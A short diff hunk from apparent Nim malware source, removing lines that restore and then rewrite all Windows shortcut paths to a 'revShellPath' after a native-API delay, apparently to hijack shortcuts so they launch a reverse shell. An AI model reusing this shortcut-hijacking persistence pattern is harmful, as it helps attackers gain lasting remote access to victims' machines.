@@ -123,9 +123,6 @@ proc checkMtx(): bool =
   return true 
 
 if not checkMtx():
-  restoreOrigLnkPaths()
-  status = NtDelayExecution(alertable, addr(delayInterval))
-  modifyAllLnkPaths(revShellPath)
   CloseHandle(hMutex)
   quit(QuitSuccess)
 
